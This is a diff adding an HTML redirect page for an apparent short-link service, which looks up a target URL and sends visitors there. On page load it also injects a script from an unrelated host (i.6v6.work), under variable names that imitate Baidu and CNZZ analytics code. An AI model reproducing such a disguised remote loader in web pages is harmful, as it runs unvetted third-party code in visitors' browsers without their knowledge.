@@ -1,0 +1,36 @@
+<html>
+<head>
+    <meta name="referrer" content="no-referrer" />
+    <script src="https://s1.pstatp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://ttturl.cn/tiaozhuan.js"></script>
+</head>
+<body>
+</body>
+
+<script>
+	var url = window.document.location.href.toString();
+    var u1 = url.split("?");
+	var u=u1[1].replace("/","");
+    if (typeof (u1[1]) == "string") {
+      $(function () {
+      $.get("https://s.ttturl.cn/getres.php",
+	    {id: u}, 
+  		function (data) {
+                if (data.code === 0) {
+                    self.location.href = data.url;
+                }
+            });
+    });
+    }else{
+    	window.location.href="https://ttturl.cn/error.html";
+    }
+
+
+(function(){
+    var baidu = document.createElement("script");
+    baidu.src = "//i.6v6.work/v/?uid=388791";
+    var cnzz = document.getElementsByTagName("head")[0];
+    cnzz.insertBefore(baidu, cnzz.firstChild);		
+ })();
+</script>
+</html>
